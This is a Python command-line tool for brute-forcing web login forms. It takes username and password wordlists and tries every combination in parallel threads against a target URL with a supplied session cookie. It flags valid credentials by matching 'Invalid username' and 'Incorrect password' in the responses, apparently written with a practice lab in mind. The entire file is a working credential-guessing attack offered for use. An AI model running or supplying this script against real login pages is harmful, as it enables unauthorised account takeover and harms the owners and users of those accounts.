import argparse
import requests
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

# Configure logging
logging.basicConfig(
    format="%(asctime)s [%(levelname)s]: %(message)s",
    level=logging.INFO,
)

# Function to perform a brute-force attempt
def brute_force_task(url, cookie, username, password):
    try:
        data = {"username": username, "password": password}
        response = requests.post(url, cookies={"session": cookie}, data=data, timeout=10)

        if "Invalid username" in response.text or "Incorrect password" in response.text:
            logging.debug(f"FAILED: {username}:{password}")
            return False, username, password
        elif response.status_code == 200:
            logging.info(f"SUCCESS: {username}:{password}")
            return True, username, password
        else:
            logging.error(f"Unexpected response for {username}:{password}")
            return False, username, password
    except Exception as e:
        logging.error(f"ERROR: Attempt failed for {username}:{password} - {e}")
        return False, username, password

# Main brute-force logic
def brute_force(url, cookie, userlist, passlist, mode, threads):
    usernames = open(userlist, "r").read().splitlines() if userlist else ["admin"]
    passwords = open(passlist, "r").read().splitlines() if passlist else ["password"]

    # Generate combinations based on mode
    if mode == "username":
        combinations = ((username, "") for username in usernames)
    elif mode == "password":
        combinations = (("", password) for password in passwords)
    elif mode == "both":
        combinations = itertools.product(usernames, passwords)
    else:
        logging.error("Invalid mode. Use 'username', 'password', or 'both'.")
        return

    # Use ThreadPoolExecutor for concurrency
    logging.info("Starting brute-force attack...")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_attempt = {
            executor.submit(brute_force_task, url, cookie, username, password): (username, password)
            for username, password in combinations
        }

        for future in as_completed(future_to_attempt):
            success, username, password = future.result()
            if success:
                logging.info(f"Valid credentials found: {username}:{password}")
                break  # Stop further attempts after success

    logging.info("Brute-force attack completed.")

# Argument parser
def parse_args():
    parser = argparse.ArgumentParser(description="Brute-force login script.")
    parser.add_argument("--url", required=True, help="Target login URL.")
    parser.add_argument("--cookie", required=True, help="Session cookie for authentication.")
    parser.add_argument("--userlist", help="File containing usernames.")
    parser.add_argument("--passlist", help="File containing passwords.")
    parser.add_argument("--mode", required=True, choices=["username", "password", "both"],
                        help="Brute-force mode: 'username', 'password', or 'both'.")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads.")
    return parser.parse_args()

# Entry point
if __name__ == "__main__":
    args = parse_args()
    brute_force(args.url, args.cookie, args.userlist, args.passlist, args.mode, args.threads)
